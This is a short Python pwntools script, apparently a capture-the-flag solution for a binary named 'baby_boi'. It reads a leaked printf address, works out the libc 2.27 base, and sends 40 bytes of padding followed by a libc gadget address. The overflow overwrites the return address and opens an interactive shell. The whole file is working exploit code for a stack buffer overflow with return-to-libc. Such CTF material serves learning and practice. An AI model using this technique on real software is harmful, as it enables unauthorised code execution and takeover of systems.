from pwn import *


pwn = process('./baby_boi', env={"LD_PRELOAD":"./libc-2.27.so"})
#pwn = process('./baby_boi')
e = ELF("./libc-2.27.so")

junk = b'\x00' * 40

pwn.recvuntil("Here I am: ")
printf_addr = pwn.recvline()
printf_addr = printf_addr.decode()

base_addr = (int(printf_addr,16) - e.symbols['printf']) 
offset = 0x4f322

bin_sh = base_addr + offset

buf = junk
buf += p64(bin_sh)

pwn.sendline(buf)
pwn.interactive()
